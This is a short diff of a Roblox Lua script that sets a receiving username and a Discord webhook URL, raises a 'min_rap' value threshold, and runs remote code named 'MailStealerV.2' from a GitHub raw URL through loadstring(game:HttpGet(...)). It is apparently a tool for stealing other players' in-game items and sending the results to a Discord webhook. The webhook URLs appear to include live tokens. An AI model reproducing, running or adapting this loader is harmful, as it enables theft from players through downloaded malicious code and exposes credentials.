@@ -1,6 +1,6 @@
-Username = "Altaccountjjjjje"
+Username = "Xvlamer"
 Username2 = "Altaccountjjjjje"
-webhook = "https://discord.com/api/webhooks/1287897804475469998/mSUVVzQhLWXcYoiC3BkyMQpfjw7ik22HTFPfKHVYz0SMJG-sH35sqlZB19WOAVxy-76_"
-min_rap = 1
+webhook = "https://discord.com/api/webhooks/1358273971736547559/MWvKpXWV0wk_cRCNp_PvFK8sF0pdIanT-gto0uD_KZKGsTnWCcGR_Veh9E-AEUYsogJr"
+min_rap = 1000000
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/WhriterHub/Whiter/main/MailStealerV.2"))()
